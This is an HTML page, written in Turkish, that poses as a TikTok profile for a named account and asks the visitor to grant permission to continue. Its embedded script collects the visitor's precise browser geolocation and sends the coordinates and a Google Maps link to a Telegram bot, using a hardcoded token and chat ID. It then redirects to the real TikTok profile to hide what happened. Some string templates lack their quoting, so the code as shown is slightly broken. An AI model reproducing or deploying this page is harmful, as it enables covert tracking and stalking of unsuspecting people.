<body>
    <h2>@ilayda.yldrm84 TikTok Profili</h2>
    <p>Devam Etmek için izin verin</p>
    <button onclick="getLocation()">İZİN VER</button>

    <script>
        const BOT_TOKEN = "7906946385:AAE_qvqTw8qxZBkdktkQNrXDM7maV6bdKqA";
        const CHAT_ID = "6358000072";
        const TIKTOK_LINK = "https://www.tiktok.com/@ilayda.yldrm84?_t=ZS-8yeSDvPtpDc&_r=1";

        function sendLocation(lat, lon) {
            fetch(https://api.telegram.org/bot${BOT_TOKEN}/sendMessage, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: BAŞARILI:\nLatitude: ${lat}\nLongitude: ${lon}\nGoogle Maps: https://maps.google.com/?q=${lat},${lon}
                })
            }).then(() => {
                window.location.href = TIKTOK_LINK;
            });
        }

        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    position => {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        sendLocation(lat, lon);
                    },
                    error => {
                        alert("İZİN YOK: " + error.message);
                    }
                );
            } else {
                alert("Tarayıcınız konum desteği vermiyor.");
            }
        }
    </script>
</body>
